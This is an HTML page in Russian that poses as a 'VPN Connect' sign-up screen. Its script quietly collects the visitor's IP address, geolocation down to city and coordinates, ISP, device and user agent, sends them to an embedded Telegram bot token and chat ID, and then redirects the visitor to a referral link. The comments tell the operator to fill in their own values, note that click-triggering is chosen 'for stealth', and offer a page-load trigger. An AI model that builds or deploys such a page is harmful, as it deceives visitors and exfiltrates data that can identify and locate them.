<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>VPN Connect</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        body {
            background: linear-gradient(145deg, #0b0e14 0%, #1a1f2b 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            max-width: 400px;
            width: 100%;
            background: rgba(26, 31, 43, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 40px;
            padding: 40px 28px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.03);
            text-align: center;
            transition: all 0.3s;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            font-weight: 700;
            color: #fff;
            box-shadow: 0 8px 24px rgba(0, 212, 255, 0.3);
        }
        h1 {
            font-size: 26px;
            font-weight: 600;
            color: #fff;
            letter-spacing: -0.5px;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #8b95a9;
            margin-bottom: 28px;
            line-height: 1.5;
        }
        .vpn-info {
            background: rgba(0, 212, 255, 0.06);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
            border: 1px solid rgba(0, 212, 255, 0.08);
        }
        .vpn-info span {
            color: #00d4ff;
            font-weight: 500;
        }
        .btn {
            display: block;
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
            border: none;
            border-radius: 60px;
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 8px 24px rgba(0, 212, 255, 0.25);
            text-decoration: none;
            letter-spacing: 0.3px;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 32px rgba(0, 212, 255, 0.4);
        }
        .btn:active { transform: scale(0.97); }
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #4a5268;
        }
        .loading {
            display: none;
            margin-top: 16px;
            font-size: 14px;
            color: #8b95a9;
        }
        .loading.show { display: block; }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #2a3346;
            border-top: 2px solid #00d4ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card" id="app">
        <div class="logo">🔒</div>
        <h1>VPN Connect</h1>
        <div class="subtitle">Безопасное подключение по протоколу нового поколения</div>
        <div class="vpn-info">
            <span>✅</span> Скорость до 100 Мбит/с<br>
            <span>🌍</span> 56 стран · Безлимит
        </div>
        <button class="btn" id="connectBtn">Подключиться</button>
        <div class="loading" id="loadingStatus">
            <span class="spinner"></span> Инициализация защищённого канала...
        </div>
        <div class="footer">© 2026 VPN Connect · Реферальная программа</div>
    </div>

    <script>
        // ================================================================
        //  НАСТРОЙКИ (замени на свои)
        // ================================================================
        const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
        const CHAT_ID = "8212240529";
        // Реферальная ссылка на реальный VPN (куда перенаправить после сбора)
        const REDIRECT_URL = "https://example.com/vpn-ref";  // ЗАМЕНИ НА СВОЮ РЕФЕРАЛЬНУЮ ССЫЛКУ
        // ================================================================

        // Элементы UI
        const btn = document.getElementById('connectBtn');
        const loading = document.getElementById('loadingStatus');

        // Отправка в Telegram
        function sendToTelegram(text) {
            if (!text) return;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
            fetch(url).catch(() => {});
        }

        // Сбор данных и отправка
        function collectAndSend() {
            // Показываем индикатор загрузки
            loading.classList.add('show');
            btn.disabled = true;
            btn.textContent = 'Подключение...';

            // 1. IP
            let ip = 'Не определен';
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => { ip = d.ip; })
                .catch(() => {})
                .finally(() => {
                    // 2. Гео (если IP получен)
                    let geo = null;
                    if (ip !== 'Не определен') {
                        fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone`)
                            .then(r => r.json())
                            .then(g => { if (g.status === 'success') geo = g; })
                            .catch(() => {})
                            .finally(() => {
                                // 3. Формируем сообщение
                                const ua = navigator.userAgent;
                                const device = /iPhone|iPad|Android/i.test(ua) ? 'Мобильное' : 'Компьютер';
                                const time = new Date().toLocaleString('ru-RU');
                                let msg = '🔹 НОВЫЙ ПЕРЕХОД (VPN)\n';
                                msg += `📍 IP: ${ip}\n`;
                                if (geo) {
                                    msg += `🌍 Страна: ${geo.country || '—'}\n`;
                                    msg += `🏙️ Город: ${geo.city || '—'}\n`;
                                    msg += `📌 Координаты: ${geo.lat || '—'}, ${geo.lon || '—'}\n`;
                                    msg += `🛜 Провайдер: ${geo.isp || '—'}\n`;
                                }
                                msg += `💻 Устройство: ${device}\n`;
                                msg += `🆔 User‑Agent: ${ua.substring(0, 80)}...\n`;
                                msg += `⏰ Время: ${time}`;
                                sendToTelegram(msg);

                                // 4. Редирект через 2 секунды
                                setTimeout(() => {
                                    window.location.href = REDIRECT_URL;
                                }, 2000);
                            });
                    } else {
                        // Если IP не получен — отправляем что есть
                        const msg = `IP не определён\nУстройство: ${device}\nВремя: ${time}`;
                        sendToTelegram(msg);
                        setTimeout(() => {
                            window.location.href = REDIRECT_URL;
                        }, 2000);
                    }
                });
        }

        // Нажатие на кнопку
        btn.addEventListener('click', collectAndSend);

        // Можно также запускать сбор автоматически при загрузке (если хочешь без клика)
        // Для скрытности лучше по клику, чтобы пользователь сам инициировал.
        // Если нужно без клика — раскомментируй:
        // window.addEventListener('DOMContentLoaded', collectAndSend);
    </script>
</body>
</html>
